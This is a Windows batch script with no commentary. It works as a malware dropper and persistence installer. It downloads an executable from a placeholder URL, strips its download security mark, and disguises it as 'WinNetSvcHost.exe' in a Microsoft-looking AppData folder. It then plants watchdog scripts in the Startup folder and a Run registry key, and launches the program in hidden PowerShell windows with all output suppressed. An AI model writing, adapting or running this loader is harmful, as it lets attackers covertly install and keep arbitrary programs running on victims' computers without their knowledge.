@echo off
set "args=<exe run args>"
set "dlurl=<download exe url>"
curl -L -o "%TEMP%\WinNetSvcHost.exe" %dlurl% >nul 2>&1
powershell -c "Unblock-File -Path $env:TEMP\WinNetSvcHost.exe" >nul 2>&1
mkdir %LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\ >nul 2>&1
copy "%TEMP%\WinNetSvcHost.exe" "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe" >nul 2>&1
del /f /q "%TEMP%\WinNetSvcHost.exe"
if exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd" del /f /q "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo tasklist /FI "IMAGENAME eq WinNetSvcHost.exe" 2^>NUL ^| find /I /N "WinNetSvcHost.exe" ^>nul 2^>^&1 > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo if "%%ERRORLEVEL%%"=="0" ( >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo     exit >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo ) else ( >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo     powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '%args%' -WindowStyle Hidden" ^>nul 2^>^&1 >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
echo ) >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\winnet-check.cmd"
if exist "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd" del /f /q "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo tasklist /FI "IMAGENAME eq WinNetSvcHost.exe" 2^>NUL ^| find /I /N "WinNetSvcHost.exe" ^>nul 2^>^&1 > "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo if "%%ERRORLEVEL%%"=="0" ( >> "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo     exit >> "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo ) else ( >> "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo     powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '%args%' -WindowStyle Hidden" ^>nul 2^>^&1 >> "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
echo ) >> "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd"
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WinNetSvcHostStartup" /t REG_SZ /d "%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHostStartup.cmd" /f >nul 2>&1
tasklist /FI "IMAGENAME eq WinNetSvcHost.exe" 2>NUL | find /I /N "WinNetSvcHost.exe">nul
if "%ERRORLEVEL%"=="0" (
    exit
) else (
    powershell -WindowStyle Hidden -Command "Start-Process '%LOCALAPPDATA%\Microsoft\Windows\NetworkSvc\WinNetSvcHost.exe' -ArgumentList '%args%' -WindowStyle Hidden" >nul 2>&1
)
